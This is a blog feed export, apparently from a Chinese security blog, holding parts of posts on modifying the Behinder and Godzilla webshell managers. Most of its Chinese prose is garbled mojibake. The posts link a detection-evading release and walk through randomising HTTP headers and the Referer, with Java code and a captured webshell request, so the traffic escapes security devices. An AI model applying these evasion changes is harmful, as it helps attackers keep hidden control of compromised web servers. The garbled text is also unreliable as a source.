jspxçš„ ï¼Œasmxçš„éƒ½æ²¡åšï¼Œåé¢åšã€‚å†°è4ï¼Œæ˜¯éœ€è¦ç»™åˆ°åŠ å¯†æ–¹å¼å’Œè§£å¯†æ–¹å¼çš„ï¼Œæˆ‘ä»¬æƒ³åŠæ³•ç›´æ¥ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«å…æ€çš„æœ¨é©¬ï¼ŒåŒ…å«åŠ è§£å¯†æ–¹å¼ï¼Œç›´æ¥æ‹¿è¿‡æ¥å¤åˆ¶ç”¨å³å¯ï¼Œåé¢æˆ‘ä»¬å†æ¥å®ç°ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250720160341116.png" alt="image-20250720160341116"></p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a><br>release 1.1 å…æ€ç‰ˆæœ¬ï¼Œsrcä»£ç ä¹Ÿä»¥ä¸Šä¼ ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½ç ”ç©¶å³å¯ã€‚<br>ä¸Šä¸ªç‰ˆæœ¬ç”±äºå†™çš„æ¯”è¾ƒèœï¼Œæ²¡å¥½æ„æ€è·Ÿå¤§å®¶è¦starï¼Œè¿™æ¬¡è‡ªæˆ‘æ„Ÿè§‰è¿˜è¡Œï¼Œä¹Ÿç®—æ˜¯å®æˆ˜èƒ½ç”¨äº†ï¼Œå¦‚æœæ„Ÿè§‰è¿˜å‡‘åˆï¼Œå¤§å®¶å¸®å¿™ç‚¹ç‚¹star</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™æˆ–è€…å·¥å…·ç”¨èµ·æ¥è¿˜è¡Œï¼Œå¸®ç¬”è€…ç‚¹ç‚¹starsã€ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            åŸç‰ˆbehinder</span><br><span class="line">https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/                   webshellå…æ€ç ”ç©¶jspç¯‡</span><br><span class="line">https://www.secpulse.com/archives/193780.html        ç®€å•æ“ä½œå®ç°å†°èjsp webshell é˜¿é‡Œäº‘å…æ€ </span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
            <tag> äºŒå¼€ </tag>
            
            <tag> behinder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†°èäºŒå¼€ä»0åˆ°1</title>
      <link href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/"/>
      <url>/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å­¦ä¹ äº†ä¸€ä¸‹å†°èå’Œå“¥æ–¯æ‹‰çš„äºŒå¼€ï¼Œä½†ä¹Ÿåªæ˜¯å­¦ä¹ äº†ä¸€ä¸¢ä¸¢çš®æ¯›ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><p>ç»§ä¸Šæ¬¡äºŒå¼€å“¥æ–¯æ‹‰åï¼Œå·²ç»è¿‡å»äº†ä¸ƒä¸ªæœˆäº†ï¼Œé¡¹ç›®æ”¶è·äº†å¾ˆå¤šstarï¼Œæ„Ÿè°¢å¤§å®¶ã€‚</p><p>ä¸Šæ¬¡æˆ‘ä»¬å·²ç»å¯¹godzillaè¿›è¡Œäº†äºŒå¼€ï¼Œè¿™æ¬¡æˆ‘ä»¬ç»§ç»­å¯¹å†°èè¿›è¡Œç®€å•çš„äºŒå¼€ã€‚</p><h5 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h5><p>é¦–å…ˆè‡´æ•¬ä¸€ä¸‹åŸç‰ˆå†°èï¼ŒåŸç‰ˆåœ°å€<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æœ€æ–°çš„[<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91">Behinder_v4.1ã€t00lsä¸“ç‰ˆã€‘</a> <a href="https://github.com/rebeyond/Behinder/releases/latest">Latest</a>]ç‰ˆæœ¬ï¼Œè¿›è¡Œé€†å‘åŠäºŒå¼€ã€‚è™½ç„¶æ˜¯4.1ç‰ˆæœ¬ï¼Œä½†æ˜¯æœ¬æ–‡è¿˜æ˜¯åœ¨å†°è3çš„æœ¨é©¬ä¸Šåšç ”ç©¶ã€‚å†°èå› ä¸ºæ¶‰åŠåˆ°è‡ªå·±è®¾ç½®åŠ å¯†è§£å¯†è„šæœ¬ï¼Œæˆ‘ä»¬å°†ä¸‹ç¯‡æ–‡ç« è¿›è¡Œç ”ç©¶ã€‚</p><p>åç¼–è¯‘ç½‘å€ï¼Œ<a href="https://www.decompiler.com/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%85%A5jar%E5%8C%85%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%BE%88%E6%96%B9%E4%BE%BF%E3%80%82">https://www.decompiler.com/ï¼Œç›´æ¥æ‹–å…¥jaråŒ…å³å¯ï¼Œå¾ˆæ–¹ä¾¿ã€‚</a></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ideaçš„æ’ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œéƒ½ä¸€æ ·ã€‚</p><p>okå¼€å§‹</p><h5 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h5><p>è¿™é‡Œç»†èŠ‚çš„åç¼–è¯‘åŠé…ç½®å°±ä¸åœ¨æ­¤æ–‡ç« ä¸­ä½“ç°äº†ï¼Œè¿™é‡Œé…ç½®çš„è¿‡ç¨‹å’Œå“¥æ–¯æ‹‰ä¸€æ¨¡ä¸€æ ·ã€‚æœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å›çœ‹ä¹‹å‰çš„æ–‡ç« <a href="https://bohemian.top/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/">godzillaäºŒå¼€</a>å­¦ä¹ ã€‚</p><p>åªæ˜¯æ¥ç€æ·»åŠ ä¸»ç±»ä¸æ˜¯å“¥æ–¯æ‹‰çš„è·¯å¾„</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701203019979.png" alt="image-20250701203019979"></p><p>æ˜¯åœ¨è¿™ä¸ªè·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„å®é™…ä¸Šæ˜¯è‡ªå·±å‡ºæ¥çš„ã€‚</p><p>è¦å°†åç¼–è¯‘çš„src\META-INF/MANIFEST.MFæºæ–‡ä»¶ï¼Œæ”¾åˆ°srcä¸‹é¢ï¼Œæ³¨æ„è·¯å¾„ã€‚è¿™ä¸ªä¸»ç±»çš„è·¯å¾„å°±è‡ªå·±å‡ºæ¥äº†ã€‚</p><p>ç‚¹å‡»é€‰ä¸­ä¸»ç±»ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥æ„‰å¿«çš„äºŒå¼€äº†ã€‚</p><h5 id="æ”¹æ ‡é¢˜"><a href="#æ”¹æ ‡é¢˜" class="headerlink" title="æ”¹æ ‡é¢˜"></a>æ”¹æ ‡é¢˜</h5><p>ç°åœ¨å°±å¯ä»¥ç¼–è¯‘äº†ï¼Œæˆ‘ä»¬å…ˆç®€å•çš„æ”¹ä¸€ä¸‹æ ‡é¢˜ã€‚</p><p>å¤åˆ¶ä¸€ä»½æ–‡ä»¶ï¼Œå†°èçš„æ ‡é¢˜åœ¨net/rebeyond/behinder/core/Constants.javaå¤åˆ¶src/net/rebeyond/behinder/core/Constants.javaï¼Œæ²¡æœ‰çš„ç›®å½•è¦åˆ›å»ºä¸€ä¸‹ã€‚ç›®å½•ä¸€å®šè¦å¯¹é½ã€‚è¿™é‡Œä¸€å®šè¦æ¸…æ¥šï¼Œä¸è¦åœ¨åŸç‰ˆçš„é‚£ä¸ªå’Œç¼–è¯‘çš„é‚£äº›æ–‡ä»¶é‡Œæ”¹ï¼Œæƒ³æ”¹ä»€ä¹ˆï¼ŒæŠŠç›®å½•å¯¹é½ï¼Œåˆ›å»ºå¤åˆ¶æ–‡ä»¶ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701204109794.png" alt="image-20250701204109794"></p><p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ç›¸å…³çš„å‚æ•°äº†ï¼Œéšæ„æ›´æ”¹ï¼Œè€æ ·å­ï¼Œæˆ‘ä»¬éšä¾¿æ”¹ä¸€ä¸‹å°±å¥½ã€‚</p><p>ç„¶åbuild project  åœ¨build artifacts å°±å¯ä»¥äº†ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701204905919.png" alt="image-20250701204905919"></p><p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œå°±æ˜¯å¦‚æœä½ è¿è¡Œç”Ÿæˆå¥½çš„jarï¼Œä»–è¯´æ•°æ®åº“æœªæ‰¾åˆ°ï¼Œ</p><p>é‚£ä¹ˆä½ éœ€è¦ç¼–è¾‘ä¸€ä¸‹ç¯å¢ƒ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205042896.png" alt="image-20250701205042896"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205104146.png" alt="image-20250701205104146"></p><p>è¿™ä¸ªworking directoryéœ€è¦è®¾æˆä½ çš„ç”Ÿæˆæ–‡ä»¶çš„ç›®å½•ï¼Œè¿™æ ·ï¼ŒBehinder.Jarå°±èƒ½æ‰¾åˆ°ç›¸å…³çš„æ•°æ®åº“æ–‡ä»¶äº†ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205303687.png" alt="image-20250701205303687"></p><p>å½“ç„¶åˆ«å¿˜äº†æŠŠBehinderè‡ªå¸¦çš„ç›®å½•éƒ½æŒªè¿‡æ¥ã€‚</p><h5 id="å…¨å±€æ”¹é€ "><a href="#å…¨å±€æ”¹é€ " class="headerlink" title="å…¨å±€æ”¹é€ "></a>å…¨å±€æ”¹é€ </h5><p>æˆ‘ä»¬çŸ¥é“ï¼Œgodzillaå’ŒBehinderéƒ½æœ‰ä¸€äº›å¼ºç‰¹å¾ï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä¸€ä¸‹æ··æ·†æˆ–è€…ç®€å•æ”¹æ”¹ã€‚</p><p>çœ‹ç½‘ä¸Šä¸€äº›å¤§å¸ˆå‚…åˆ†æçš„ç»“æœï¼Œä¼¼ä¹éƒ½æ¯”è¾ƒä¹…è¿œï¼ˆ3.0ï¼‰ï¼Œæˆ‘ä»¬å°è¯•åˆ†æä¸€ä¸‹ã€‚</p><p>å†°èæ˜¯æ²¡æœ‰åƒå“¥æ–¯æ‹‰ä¸€æ ·çš„æµ‹è¯•æŒ‰é’®çš„ï¼Œæˆ‘ä»¬åªèƒ½ç›´æ¥æ‰“å¼€ã€‚</p><p>åœ¨æˆ‘ä»¬ç›´æ¥æ‰“å¼€åï¼Œä¼šå‘ç°ï¼Œæœ‰ä¸‰ä¸ªæ•°æ®åŒ…</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701210316376.png" alt="image-20250701210316376"></p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªåŒ…ï¼Œæˆ‘ä»¬å°±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /rebeyond/mian2.php HTTP/1.1</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://192.168.133.128:11001/DR6D/NX.php</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class="line">Content-Length: 3096</span><br><span class="line">Host: 192.168.133.128:11001</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">3Mn1yNMtoZViV5wotQHPJtww..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 01 Jul 2025 12:55:12 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Set-Cookie: PHPSESSID=ro9l5p843f3h6l9s30mcg8951c; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Length: 286</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°è¯·æ±‚åŒ…ä¸­æœ‰</p><p>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>Content-type: application/x-www-form-urlencoded<br>Referer: <a href="http://192.168.133.128:11001/DR6D/NX.php">http://192.168.133.128:11001/DR6D/NX.php</a><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</p><p>è¿™äº›éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹çš„ï¼Œ</p><p>åœ¨net/rebeyond/behinder/core/Constants.java</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701212418925.png" alt="image-20250701212418925"></p><p>å¯ä»¥çœ‹åˆ°ç›¸å…³çš„å®šä¹‰</p><p>Accept: application/json, text/javascript, <em>/</em>; q=0.01ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚æµè§ˆå™¨æˆ–çˆ¬è™«ï¼‰å‘Šè¯‰æœåŠ¡å™¨ï¼š</p><blockquote><p>â€œæˆ‘èƒ½æ¥å—è¿™äº›ç±»å‹çš„æ•°æ®æ ¼å¼ä½œä¸ºå“åº”å†…å®¹ï¼ŒæŒ‰ä¼˜å…ˆçº§æ’åˆ—å¦‚ä¸‹ã€‚â€</p></blockquote><ol><li><p><strong><code>application/json</code></strong></p><ul><li>å®¢æˆ·ç«¯æœ€å¸Œæœ›æœåŠ¡å™¨è¿”å› JSON æ ¼å¼çš„æ•°æ®ï¼›</li><li>å…¸å‹äºå‰åç«¯é€šä¿¡ã€Ajax è¯·æ±‚ã€API æ¥å£è°ƒç”¨ã€‚</li></ul></li><li><p><strong><code>text/javascript</code></strong></p><ul><li>å¦‚æœä¸èƒ½è¿”å› JSONï¼Œå¯ä»¥è¿”å› JavaScript è„šæœ¬ï¼ˆä¾‹å¦‚ JSONP å“åº”ï¼‰ï¼›</li><li>è™½ç„¶ç°åœ¨ <code>application/javascript</code> æ›´æ ‡å‡†ï¼Œä½† <code>text/javascript</code> ä»è¢«å¹¿æ³›æ”¯æŒã€‚</li></ul></li><li><p><strong><code>\*/\*; q=0.01</code></strong></p><ul><li><p><code>*/*</code> æ„æ€æ˜¯ã€Œä»»ä½•å…¶ä»–ç±»å‹éƒ½å¯ä»¥æ¥å—ã€ï¼›</p></li><li><p><code>q=0.01</code> æ˜¯è´¨é‡å› å­ï¼ˆquality factorï¼‰ï¼Œè¡¨ç¤ºä¼˜å…ˆçº§å¾ˆä½ï¼ˆå–å€¼èŒƒå›´æ˜¯ 0.0 ~ 1.0ï¼‰ï¼›</p></li><li><p>è¿™é‡Œçš„ <code>q=0.01</code> è¡¨ç¤ºé™¤éå‰é¢éƒ½ä¸æ»¡è¶³ï¼Œå¦åˆ™ä¸è€ƒè™‘å…¶ä»–ç±»å‹ã€‚</p></li></ul></li></ol><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°éƒ½æ˜¯å¸¸ç”¨çš„Accept ï¼Œæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„ã€‚</p><p>åŸç‰ˆé‡Œé¢ç»™äº†ä¸€ä¸ªacceptï¼Œæœ‰åŒå­¦é—®ï¼Œä¸æ˜¯ç»™äº†ä¸¤ä¸ªä¹ˆï¼Œæ˜¯çš„ï¼Œç»™äº†ä¸¤ä¸ªï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701214434071.png" alt="image-20250701214434071"></p><p>åœ¨åŒç›®å½•ä¸‹çš„shellserviceé‡Œé¢ï¼Œä½œè€…å®šä¹‰äº†è¿™ä¸ªï¼Œæœ€åä¸€ä¸ªæ°¸è¿œä¸ä¼šè¢«é€‰ä¸­ã€‚æˆ‘ä»¬ç»™ä»–åŠ ä¸Šï¼Œå¹¶ä¸”åŠ å‡ ä¸ªå­—ç¬¦ä¸²éšæœºã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701215842183.png" alt="image-20250701215842183"></p><p>è¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥ç®€å•éšæœºäº†ï¼Œå¤§æ¦‚ç‡æ„Ÿè§‰ä¸ä¼šè¢«è®¾å¤‡æ ‡è®°ï¼Œå¤ªæ™®é€šäº†</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701220326930.png" alt="image-20250701220326930"></p><p>ä¸€èˆ¬ä¹Ÿéƒ½æ˜¯è¿™ç§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static String[] userAgents = new String[]&#123;&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;&#125;;</span><br></pre></td></tr></table></figure><p>uaä¹Ÿå®šä¹‰äº†ä¸€ä¸‹ï¼Œçœ‹èµ·æ¥ä¹Ÿéƒ½æ˜¯ä¸€äº›å¸¸è§çš„uaï¼Œæˆ‘ä»¬ç›´æ¥ç»™ä»–æ¢æˆæˆ‘çš„edgeï¼Œgoogleï¼Œfirefoxçš„ã€‚</p><p>  public static String[] userAgentsåœ¨è¿™é‡Œä¿®æ”¹å°±è¡Œã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701221207713.png" alt="image-20250701221207713"></p><p>Accept-Languageè¿™é‡Œä¹Ÿç®€å•ä¿®æ”¹ä¸€ä¸‹ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701222840016.png" alt="image-20250701222840016"></p><p>å¤§å®¶ä»”ç»†è§‚å¯Ÿåœ¨ä¸Šé¢bpå›¾é‡Œé¢æœ‰ä¸€ä¸ªRefererå­—æ®µï¼Œè¿™ä¸ªå­—æ®µæ˜¯ä½œè€…åŠ çš„ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private String getReferer() &#123;</span><br><span class="line">        String refer;</span><br><span class="line">        URL u = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            u = new URL(this.effectShellEntity.getString(&quot;url&quot;));</span><br><span class="line">            String oldPath = u.getPath();</span><br><span class="line">            String newPath = &quot;&quot;;</span><br><span class="line">            String ext = oldPath.substring(oldPath.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            oldPath = oldPath.substring(0, oldPath.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            String[] parts = oldPath.split(&quot;/&quot;);</span><br><span class="line">            for (int i = 0; i &lt; parts.length; ++i) &#123;</span><br><span class="line">                if (parts[i].length() == 0) continue;</span><br><span class="line">                if (new Random().nextBoolean()) &#123;</span><br><span class="line">                    int randomNum = new Random().nextInt(parts[i].length());</span><br><span class="line">                    if (randomNum == 0) &#123;</span><br><span class="line">                        randomNum = 4;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String randStr = new Random().nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();</span><br><span class="line">                    newPath = newPath + &quot;/&quot; + randStr;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                newPath = newPath + &quot;/&quot; + parts[i];</span><br><span class="line">            &#125;</span><br><span class="line">            newPath = newPath + ext;</span><br><span class="line">            refer = this.currentUrl.replace(u.getPath(), newPath);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return this.currentUrl;</span><br><span class="line">        &#125;</span><br><span class="line">        return refer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225252868.png" alt="image-20250701225252868"></p><p>å“åº”çš„ä»£ç ä¹Ÿæ˜¯åœ¨shellservcieé‡Œï¼Œè¿™ä¸€å¤§æ®µçš„æ„æ€å°±æ˜¯ï¼Œå…ˆè·å–æ ¹ç›®å½•å¦‚Referer: <a href="http://192.168.133.128:11001/%EF%BC%8C%E7%84%B6%E5%90%8E%E9%9A%8F%E6%9C%BA%E5%8F%96%E5%87%A0%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%94%BE%E5%88%B0%E5%90%8E%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E6%98%AF%E4%BB%80%E4%B9%88%E8%AF%AD%E8%A8%80%E7%9A%84%E8%84%9A%E6%9C%AC%E5%B0%B1%E5%8A%A0%E4%B8%80%E4%B8%8B%E9%9A%8F%E6%9C%BA%E5%87%A0%E4%B8%AA%E5%AD%97%E7%AC%A6.php%EF%BC%8C%E6%AF%8F%E6%AC%A1%E6%9B%BF%E6%8D%A2%E9%83%BD%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%9A%84%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%B8%8D%E6%9B%BF%E6%8D%A2%E6%88%91%E4%BB%AC%E5%BD%93%E5%89%8D%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%8F%AF%E8%83%BD%E9%83%A8%E6%9B%BF%E6%8D%A2shell%E5%90%8D%E5%AD%97%EF%BC%8C%E5%B0%B1%E5%83%8F%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7%E3%80%82">http://192.168.133.128:11001/ï¼Œç„¶åéšæœºå–å‡ ä¸ªå­—ç¬¦ï¼Œæ”¾åˆ°åé¢ï¼Œç„¶åæ˜¯ä»€ä¹ˆè¯­è¨€çš„è„šæœ¬å°±åŠ ä¸€ä¸‹éšæœºå‡ ä¸ªå­—ç¬¦.phpï¼Œæ¯æ¬¡æ›¿æ¢éƒ½æ˜¯éšæœºçš„ï¼Œå¯èƒ½ä¸æ›¿æ¢æˆ‘ä»¬å½“å‰çš„ç›®å½•ï¼Œå¯èƒ½éƒ¨æ›¿æ¢shellåå­—ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚</a></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225830441.png" alt="image-20250701225830441"></p><p>å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªrefererå»æ‰ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225930317.png" alt="image-20250701225930317"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230032932.png" alt="image-20250701230032932"></p><p><img 